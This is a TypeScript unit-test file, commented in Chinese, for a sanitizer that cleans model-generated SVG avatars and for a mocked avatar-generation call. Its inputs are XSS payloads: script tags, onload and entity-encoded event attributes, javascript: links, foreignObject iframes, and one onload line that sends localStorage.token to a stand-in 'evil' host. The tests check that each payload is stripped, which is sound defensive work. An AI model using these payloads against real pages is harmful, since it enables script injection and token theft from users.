import { describe, expect, it } from "vitest";
import { generateAvatarSvg, sanitizeAgentSvg } from "./avatar.js";

/** 出片里数一下某个标签出现了几次。清洗器会重排结构，所以只数数量，不比字符串。 */
const count = (out: string | null, tag: string) => (out?.match(new RegExp(`<${tag}[\\s/>]`, "g")) ?? []).length;

describe("sanitizeAgentSvg 放行什么", () => {
  it("合法线稿原样留下：几何属性和描边都在", () => {
    const out = sanitizeAgentSvg(
      '<g stroke-width="2" stroke-linecap="round"><rect x="3" y="8" width="18" height="10"/><path d="M7 13h3"/><circle cx="15" cy="12" r="1"/></g>',
    );

    expect(out).toContain("<rect");
    expect(out).toContain('d="M7 13h3"');
    expect(out).toContain("<circle");
    expect(out).toContain('stroke-width="2"');
  });

  it("模型自己多包一层 <svg> 也收，但 <svg> 本身不进出片", () => {
    const out = sanitizeAgentSvg('<svg viewBox="0 0 24 24"><g><path d="M1 1"/></g></svg>');

    expect(out).not.toContain("<svg");
    expect(out).toContain('d="M1 1"');
  });
});

describe("sanitizeAgentSvg 剥掉什么", () => {
  it("<script>", () => {
    expect(sanitizeAgentSvg('<g><script>alert(1)</script><path d="M1 1"/></g>')).not.toMatch(/script/i);
  });

  it("on* 事件属性", () => {
    const out = sanitizeAgentSvg(`<g><circle cx="1" cy="1" r="1" onload="fetch('//evil/'+localStorage.token)"/></g>`);

    expect(out).not.toMatch(/onload/i);
    expect(out).toContain("<circle");
  });

  // 白名单是精确匹配，所以大小写变形天然进不来 —— 不需要先归一化属性名
  it("大小写变形的事件属性", () => {
    expect(sanitizeAgentSvg('<g><path d="M1 1" OnLoad="x()" ONCLICK="y()"/></g>')).not.toMatch(/on(load|click)/i);
  });

  // 解析器先把实体解开，解开之后照样撞在白名单上
  it("实体编码绕过的事件属性", () => {
    expect(sanitizeAgentSvg('<g><path d="M1 1" &#111;nload="x()"/></g>')).not.toMatch(/onload/i);
  });

  it("外层注入的 <svg onload>", () => {
    const out = sanitizeAgentSvg('<svg onload="alert(1)"><g><path d="M1 1"/></g></svg>');

    expect(out).not.toMatch(/onload/i);
    expect(out).toContain('d="M1 1"');
  });

  it("xlink:href / href（连着 <a> 一起，但里面的 path 保下来）", () => {
    const out = sanitizeAgentSvg('<g><a xlink:href="javascript:alert(1)"><path d="M1 1"/></a></g>');

    expect(out).not.toMatch(/href|javascript/i);
    expect(out).toContain('d="M1 1"');
  });

  it("<foreignObject> 连内容一起", () => {
    const out = sanitizeAgentSvg(
      '<g><foreignObject><iframe src="javascript:alert(1)"></iframe></foreignObject><path d="M1 1"/></g>',
    );

    expect(out).not.toMatch(/foreignObject|iframe/i);
    expect(out).toContain('d="M1 1"');
  });

  it("<use>（引用宿主页面的 id 是一条外链通道）", () => {
    expect(sanitizeAgentSvg('<g><use href="#x"/><path d="M1 1"/></g>')).not.toContain("<use");
  });

  it("<style> 标签和 style 属性", () => {
    const out = sanitizeAgentSvg(
      '<g><style>*{x:y}</style><path d="M1 1" style="background:url(javascript:alert(1))"/></g>',
    );

    expect(out).not.toMatch(/style=|<style|javascript/i);
  });

  // 颜色由页面的 CSS 决定，否则深色模式下会出现看不见的头像
  it("fill / stroke 颜色", () => {
    const out = sanitizeAgentSvg('<g fill="#ff0000" stroke="red"><path d="M1 1" fill="blue"/></g>');

    expect(out).not.toMatch(/fill="|stroke="/);
    expect(out).toContain("<path");
  });
});

describe("sanitizeAgentSvg 什么情况下整张作废", () => {
  it("嵌套超过 8 层", () => {
    expect(sanitizeAgentSvg(`${"<g>".repeat(9)}<path d="M1 1"/>${"</g>".repeat(9)}`)).toBeNull();
  });

  // 拆非法标签的壳时照样加深度，否则「一万层 <a> 里放一个 path」就绕开了所有上限
  it("非法标签堆出来的深度一样算", () => {
    expect(sanitizeAgentSvg(`${"<a>".repeat(9)}<path d="M1 1"/>${"</a>".repeat(9)}`)).toBeNull();
  });

  it("单条 d 超过 2KB", () => {
    expect(sanitizeAgentSvg(`<g><path d="${"M1 1 ".repeat(500)}"/></g>`)).toBeNull();
  });

  it("节点数超过 60", () => {
    expect(sanitizeAgentSvg(`<g>${'<circle cx="1" cy="1" r="1"/>'.repeat(61)}</g>`)).toBeNull();
  });

  it("体积过大", () => {
    expect(sanitizeAgentSvg(`<g>${'<circle cx="1" cy="1" r="1"/>'.repeat(400)}</g>`)).toBeNull();
  });

  // 只剩 <g> 等于一张白图，宁可回落默认图标，也别在界面上留一块看不见的空白
  it("洗完只剩 <g>，一个画得出线的标签都没有", () => {
    expect(sanitizeAgentSvg("<g><script>x</script></g>")).toBeNull();
    expect(sanitizeAgentSvg("<g><g/></g>")).toBeNull();
  });

  it("压根不是 XML、或者空串", () => {
    expect(sanitizeAgentSvg("not xml at all")).toBeNull();
    expect(sanitizeAgentSvg("")).toBeNull();
    expect(sanitizeAgentSvg("   ")).toBeNull();
  });
});

describe("sanitizeAgentSvg 拆壳时的合并", () => {
  // 拆壳会把内层元素提到父级，同一个标签因此会被写多次。
  // 合并时不当心就会得到「数组里套数组」，XMLBuilder 拿到它会吐出畸形标签
  it("多个非法壳里的同名标签合并成平坦的一串", () => {
    const out = sanitizeAgentSvg('<g><a><path d="M1 1"/></a><b><path d="M2 2"/><path d="M3 3"/></b></g>');

    expect(count(out, "path")).toBe(3);
    expect(out).toContain('d="M1 1"');
    expect(out).toContain('d="M2 2"');
    expect(out).toContain('d="M3 3"');
  });

  // 壳在前、同名的合法标签在后：合并写错的话后者会把前者整个顶掉
  it("拆出来的和原本就合法的同名标签都保得住", () => {
    const out = sanitizeAgentSvg('<g><a><path d="M1 1"/></a><path d="M2 2"/></g>');

    expect(count(out, "path")).toBe(2);
    expect(out).toContain('d="M1 1"');
    expect(out).toContain('d="M2 2"');
  });
});

const fakeClient = (text: string) =>
  ({ messages: { create: async () => ({ content: [{ type: "text", text }] }) } }) as never;

describe("generateAvatarSvg", () => {
  it("模型爱加的代码围栏会被剥掉，剩下的照样清洗", async () => {
    const raw = '```xml\n<g stroke-width="2"><path d="M4 4h16"/></g>\n```';

    await expect(generateAvatarSvg(fakeClient(raw), "m", "法务顾问", "合同审查")).resolves.toContain('d="M4 4h16"');
  });

  // 头像是锦上添花，任何失败都不该让 Agent 创建/重画这件事本身失败
  it("模型抛错 → null，不往外抛", async () => {
    const bad = {
      messages: {
        create: async () => {
          throw new Error("502");
        },
      },
    } as never;

    await expect(generateAvatarSvg(bad, "m", "x", "y")).resolves.toBeNull();
  });

  it("模型答的是人话不是标签 → null", async () => {
    await expect(generateAvatarSvg(fakeClient("我不会画"), "m", "x", "y")).resolves.toBeNull();
  });
});
